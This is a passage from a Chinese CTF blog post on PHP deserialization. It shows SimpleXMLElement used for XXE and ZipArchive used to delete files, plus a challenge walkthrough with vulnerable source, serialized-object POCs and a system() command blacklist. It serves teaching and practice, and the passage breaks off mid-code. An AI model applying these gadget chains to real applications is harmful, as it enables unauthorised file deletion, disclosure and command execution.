class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>成功发送post数据包<br>
<img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_19,color_FFFFFF,t_70,g_se,x_16-16672739578748.png" alt="在这里插入图片描述"></p>
<p><strong>bestphp’s revenge</strong></p>
<p>也可以看看<a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121319348">ctfshow的web259</a></p>
<p>看看<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/114445325">feng师傅的wp</a></p>
<h4 id="使用-simplexmlelement-类进行-xxe"><a class="markdownIt-Anchor" href="#使用-simplexmlelement-类进行-xxe"></a> 使用 SimpleXMLElement 类进行 XXE</h4>
<h5 id="simplexmlelement类"><a class="markdownIt-Anchor" href="#simplexmlelement类"></a> SimpleXMLElement类</h5>
<p>SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。</p>
<p>官方文档中对SimpleXMLElement 类的构造方法 <code>SimpleXMLElement::__construct</code> 的定义如下:</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/9c463254527f22878a51271db820c6a4-16672739578749.png" alt="image-20210118131857853"></p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/87f41bb0c1b7c7ff829dcbf4e1bdd035-166727395787410.png" alt="image-20210118131957770"></p>
<p>意味着，当我们将第三个参数<code>data_is_url</code>设置为true的话，我们就可以调用远程xml文件，实现xxe的攻击。第二个参数的常量值我们设置为<code>2</code>即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
<h5 id="suctf2018-homework"><a class="markdownIt-Anchor" href="#suctf2018-homework"></a> SUCTF2018-Homework</h5>
<p>可以看看<a target="_blank" rel="noopener" href="https://johnfrod.top/ctf/suctf-2018homework/">这个的wp</a></p>
<h4 id="使用-ziparchive-类来删除文件"><a class="markdownIt-Anchor" href="#使用-ziparchive-类来删除文件"></a> 使用 ZipArchive 类来删除文件</h4>
<p>ZipArchive类可以对文件进行压缩与解压缩处理。</p>
<p>条件：php 5.20</p>
<p>常见的类方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">addEmptyDir</span>：添加一个新的文件目录</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">addFile</span>：将文件添加到指定zip压缩包中</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">addFromString</span>：添加新的文件同时将内容添加进去</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">close</span>：关闭ziparchive</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">extractTo</span>：将压缩包解压</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">open</span>：打开一个zip压缩包</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">deleteIndex</span>：删除压缩包中的某一个文件，如：<span class="title function_ invoke__">deleteIndex</span>(<span class="number">0</span>)代表删除第一个文件</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">deleteName</span>：删除压缩包中的某一个文件名称，同时也将文件删除</span><br></pre></td></tr></table></figure>
<p>我们看看<code>ZipArchive::open</code>方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ZipArchive</span>::<span class="title function_ invoke__">open</span>(<span class="keyword">string</span> <span class="variable">$filename</span>, <span class="keyword">int</span> <span class="variable">$flags</span>=<span class="number">0</span>)</span><br><span class="line">该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。</span><br><span class="line"></span><br><span class="line">filename：要打开的ZIP存档的文件名。</span><br><span class="line">flags：用于打开档案的模式。有以下几种模式：</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>：如果不存在则创建一个zip压缩包。</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">RDONLY</span>：只读模式打开压缩包。</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">EXCL</span>：如果压缩包已经存在，则出错。</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">CHECKCONS</span>：对压缩包执行额外的一致性检查，如果失败则显示错误。</span><br><span class="line">注意，如果设置flags参数的值为 <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span> 的话，可以把指定文件删除。这里我们跟进方法可以看到<span class="keyword">const</span> <span class="variable constant_">OVERWRITE</span> = <span class="number">8</span>，也就是将OVERWRITE定义为了常量<span class="number">8</span>，我们在调用时也可以直接将flags赋值为<span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>也就是说我们可以通过ZipArchive直接调用open方法删除目标机上的文件</p>
<h5 id="梦里花开牡丹亭"><a class="markdownIt-Anchor" href="#梦里花开牡丹亭"></a> 梦里花开牡丹亭</h5>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 当waf.txt没读取成功时才能得到flag</span></span><br><span class="line">            <span class="title function_ invoke__">shell</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);    <span class="comment">// filename=php://filter/read=convert.base64-encode/resource=shell</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这串代码就是一个简单的反序列化POC</p>
<p>首先我们需要利用<code>file_get_contents</code>来得到文件内容</p>
<p>我们先让<code>register</code>的值为admin，进入<code>$this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content)</code>，进入login类后，我们需要让<code>username</code>=admin,<code>password</code>=admin，进入<code>$this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content)</code>，一如既往的，我们让<code>file</code>的值为<code>open</code>，那么我们就可以调用open类的open方法，达到我们的目的。</p>
<p>构造poc(其他师傅的)</p>
<p>因为前面包含<code>shell.php</code>，首先读取shell.php的内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;filename = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=shell&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;content = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>shell.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到function<code>shell</code>，所以我们可以通过反序列化，来调用shell方法，然后执行<code>system</code>来命令执行</p>
<p>这儿遇到一个问题，open的方法，当waf.txt不存在时，我们才能调用shell方法，我们需要删除waf.txt,想到了原生类,且需要原生类中有open方法，去删除waf.txt.</p>
<p>遍历一个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;open&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>找到了<code>ZipArchive::open</code></p>
<p>如果设置flags参数的值为 <code>ZipArchive::OVERWRITE</code> 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ZipArchive</span>::<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>, <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>)</span><br></pre></td></tr></table></figure>
<p>删除waf.txt的POC</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span 